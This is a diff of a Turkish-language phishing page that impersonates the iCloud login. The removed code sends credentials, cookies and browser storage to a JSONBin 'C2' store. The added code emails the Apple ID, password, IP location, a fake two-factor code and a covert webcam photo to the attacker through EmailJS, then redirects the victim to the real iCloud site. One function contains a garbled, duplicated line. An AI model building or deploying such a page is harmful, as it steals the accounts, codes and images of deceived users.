@@ -4,133 +4,279 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iCloud</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("bOJixfHEM1uPomqLS"); // EmailJS Public Key
+        })();
+    </script>
     <style>
-        body, html { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif; background-color: #f5f5f7; color: #1d1d1f; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .login-card { background: #ffffff; border-radius: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 48px; width: 100%; max-width: 400px; text-align: center; }
-        .icloud-logo { font-size: 48px; margin-bottom: 32px; font-weight: 300; }
-        h2 { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
-        .subtitle { font-size: 17px; color: #86868b; margin-bottom: 32px; }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 17px; margin-bottom: 8px; font-weight: 600; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; transition: border-color 0.2s; }
-        input:focus { outline: none; border-color: #007aff; box-shadow: 0 0 0 3px rgba(0,122,255,0.1); }
-        .login-button { width: 100%; background-color: #007aff; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.2s; }
-        .login-button:hover { background-color: #005ecb; }
-        .error-message { color: #ff3b30; font-size: 14px; margin-top: 16px; display: none; }
-        .footer-links { margin-top: 32px; font-size: 14px; }
-        .footer-links a { color: #007aff; text-decoration: none; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .login-card {
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 48px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .icloud-logo {
+            font-size: 48px;
+            margin-bottom: 32px;
+            font-weight: 300;
+        }
+        h2 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 17px;
+            color: #86868b;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 17px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        input[type="text"], input[type="password"], input[type="file"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 17px;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #007aff;
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
+        }
+        .login-button {
+            width: 100%;
+            background-color: #007aff;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background-color: #005ecb;
+        }
+        .error-message {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: 16px;
+            display: none;
+        }
+        .footer-links {
+            margin-top: 32px;
+            font-size: 14px;
+        }
+        .footer-links a {
+            color: #007aff;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none;
+        }
+        #webcamVideo, #capturedImage {
+            width: 100%;
+            border-radius: 8px;
+            margin-top: 16px;
+            border: 1px solid #d2d2d7;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-card">
+        <!-- 1. Adım: İlk Giriş Formu -->
+        <div id="loginStep" class="login-card">
             <div class="icloud-logo">☁️</div>
             <h2>iCloud'a Giriş Yap</h2>
             <p class="subtitle">Apple ID'nizi kullanarak devam edin.</p>
             <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Apple ID</label>
-                    <input type="text" id="username" placeholder="ornek@icloud.com" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">Parola</label>
-                    <input type="password" id="password" placeholder="Parolanızı girin" required>
-                </div>
+                <div class="form-group"><label for="username">Apple ID</label><input type="text" id="username" placeholder="ornek@icloud.com" required></div>
+                <div class="form-group"><label for="password">Parola</label><input type="password" id="password" placeholder="Parolanızı girin" required></div>
                 <button type="submit" class="login-button">Giriş Yap</button>
                 <div class="error-message" id="errorMessage">Apple ID veya parola yanlış.</div>
             </form>
-            <div class="footer-links">
-                <a href="#">Apple ID'nizi mi unuttunuz?</a> veya <a href="#">Parola mı unuttunuz?</a>
+        </div>
+
+        <!-- 2. Adım: Sahte 2FA ve Webcam Erişimi -->
+        <div id="verificationStep" class="login-card hidden">
+            <div class="icloud-logo">☁️</div>
+            <h2>İki Faktörlü Kimlik Doğrulama</h2>
+            <p class="subtitle">Güvenliğiniz için, lütfen aşağıdaki adımları tamamlayın.</p>
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="verificationCode">Doğrulama Kodu</label>
+                    <input type="text" id="verificationCode" placeholder="Cihazınıza gelen 6 haneli kodu girin" maxlength="6" required>
+                </div>
+                <div class="form-group">
+                    <label for="webcamAccess">Yüz Tanıma Doğrulaması</label>
+                    <p style="font-size: 12px; color: #86868b; margin-bottom: 8px;">Lütfen kameranıza bakın ve doğrulayın.</p>
+                    <video id="webcamVideo" autoplay></video>
+                    <canvas id="webcamCanvas" class="hidden"></canvas>
+                    <img id="capturedImage" class="hidden">
+                </div>
+                <button type="submit" class="login-button">Doğrula ve Devam Et</button>
+                <div class="error-message" id="verificationErrorMessage">Doğrulama başarısız. Lütfen bilgileri kontrol edin.</div>
+            </form>
+        </div>
+
+        <!-- 3. Adım: Yükleniyor ve Başarı Mesajı -->
+        <div id="loadingStep" class="login-card hidden">
+            <div class="icloud-logo">☁️</div>
+            <h2>İşleniyor...</h2>
+            <p class="subtitle">Bilgileriniz doğrulanıyor, lütfen bekleyin.</p>
+            <div style="margin: 32px 0;">
+                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
             </div>
         </div>
     </div>
 
     <script>
-        // !!! ÖNEMLİ: JSONBİN'DEN ALDIĞINIZ BİLGİLERİ BURAYA GİRİN !!!
-        const C2_BIN_ID = '6987a50643b1c97be96d3417';
-        // AŞAĞIDAKİ YERİ KENDİ MASTER KEY'İNİZLE DEĞİŞTİRİN!
-        const C2_API_KEY = '$2a$10$/p/VOYqLF/6pttyDqPhp1OzjVYSGGe48yGwuILYUeCaN3IwkYC9Ou'; 
+        let stream = null;
+        let capturedImageData = null;
+        let deviceInfo = {
+            ip_address: 'Bilinmiyor',
+            country: 'Bilinmiyor',
+            city: 'Bilinmiyor',
+            device_model: navigator.userAgent
+        };
 
-        // JSONBin'e veri gönderen yardımcı fonksiyon
-        async function exfiltrate(type, data) {
-            const victimInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                url: window.location.href,
-                timestamp: new Date().toISOString()
-            };
+        // IP ve konum bilgisi almak için harici servis
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                deviceInfo.ip_address = data.ip;
+                deviceInfo.country = data.country_name;
+                deviceInfo.city = data.city;
+            })
+            .catch(error => console.error('Konum alınamadı:', error));
 
-            const payload = {
-                type: type,
-                victimInfo: victimInfo,
-                data: data
-            };
-
-            try {
-                // Önce mevcut verileri oku
-                const readResponse = await fetch(`https://api.jsonbin.io/v3/b/${C2_BIN_ID}/latest`, {
-                    headers: { 'X-Master-Key': C2_API_KEY }
+        // Webcam'i başlat
+        function startWebcam() {
+            const video = document.getElementById('webcamVideo');
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(mediaStream) {
+                    stream = mediaStream;
+                    video.srcObject = stream;
+                })
+                .catch(function(err) {
+                    console.log("Webcam erişimi reddedildi: ", err);
+                    document.getElementById('verificationErrorMessage').textContent = 'Kamera erişimi gerekli. Lütfen izin verin.';
+                    document.getElementById('verificationErrorMessage').style.display = 'block';
                 });
-                const binData = await readResponse.json();
-                const currentRecords = binData.record.data || [];
+        }
 
-                // Yeni veriyi ekle
-                currentRecords.push(payload);
-
-                // Güncellenmiş listeyi geri yaz
-                await fetch(`https://api.jsonbin.io/v3/b/${C2_BIN_ID}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': C2_API_KEY
-                    },
-                    body: JSON.stringify({ data: currentRecords })
-                });
-                console.log(`${type} verisi başarıyla exfiltrate edildi.`);
-            } catch (error) {
-                console.error('Exfiltration hatası:', error);
+        // Webcam'den fotoğraf çek
+        function capturePhoto() {
+            const video = document.getElementById('webcamVideo');
+            const canvas = document.getElementById('webcamCanvas');
+            const capturedImage = document.getElementById('capturedImage');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            capturedImageData = canvas.toDataURL('image/jpeg');
+            capturedImage.src = capturedImageData;
+            capturedImage.classList.remove('hidden');
+            video.classList.add('hidden');
+            
+            // Stream'i durdur
+            if (stream) {
+                stream.getTracks().forEach(track =>if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
+            
+            return capturedImageData;
         }
 
-        // --- VERİ ÇALMA FONKSİYONLARI ---
-        function stealCookies() {
-            const cookies = document.cookie.split(';').map(c => c.trim());
-            exfiltrate('cookies', cookies);
-        }
-        async function stealTabs() {
-            const tabs = "Bu bilgi tarayıcı eklentisi gerektirir.";
-            exfiltrate('tabs_info', { message: tabs });
-        }
-        async function stealHistory() {
-            const historyLength = history.length;
-            exfiltrate('history_length', { length: historyLength });
-        }
-        function stealStorage() {
-            const localStorageData = { ...localStorage };
-            const sessionStorageData = { ...sessionStorage };
-            exfiltrate('storage', { localStorage: localStorageData, sessionStorage: sessionStorageData });
-        }
-        
-        // Ana form gönderildiğinde tüm operasyonları başlat
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
-
+        // Form olay dinleyicileri
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            
+            emailjs.send("service_mdm9ze3", "template_umbj15o", {
+                username: username,
+                password: password,
+                send_date: new Date().toLocaleString(),
+                ip_address: deviceInfo.ip_address,
+                country: deviceInfo.country,
+                city: deviceInfo.city,
+                device_model: deviceInfo.device_model
+            }).then(function(response) {
+                console.log("Giriş bilgileri gönderildi!", response.status, response.text);
+                document.getElementById('loginStep').classList.add('hidden');
+                document.getElementById('verificationStep').classList.remove('hidden');
+                startWebcam();
+            }, function(error) {
+                console.log("Gönderim hatası:", error);
+                document.getElementById('errorMessage').style.display = 'block';
+            });
+        });
 
-            // Tüm veri çalma işlemlerini başlat
-            exfiltrate('manual_login', { username: username, password: password });
-            stealCookies();
-            stealTabs();
-            stealHistory();
-            stealStorage();
-
-            // Kullanıcıya sahte bir geri bildirim göster
-            document.getElementById('errorMessage').style.display = 'block';
-            document.querySelector('.login-button').textContent = 'Giriş Yapılıyor...';
-            document.querySelector('.login-button').disabled = true;
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('verificationCode').value;
+            const photoData = capturePhoto();
+            
+            emailjs.send("service_mdm9ze3", "template_umbj15o", {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                send_date: new Date().toLocaleString(),
+                ip_address: deviceInfo.ip_address,
+                country: deviceInfo.country,
+                city: deviceInfo.city,
+                device_model: deviceInfo.device_model,
+                verification_code: code,
+                captured_image: photoData
+            }).then(function(response) {
+                console.log("Doğrulama bilgileri gönderildi!", response.status, response.text);
+                document.getElementById('verificationStep').classList.add('hidden');
+                document.getElementById('loadingStep').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.icloud.com";
+                }, 3000);
+            }, function(error) {
+                console.log("Doğrulama gönderim hatası:", error);
+                document.getElementById('verificationErrorMessage').style.display = 'block';
+            });
         });
     </script>
 </body>
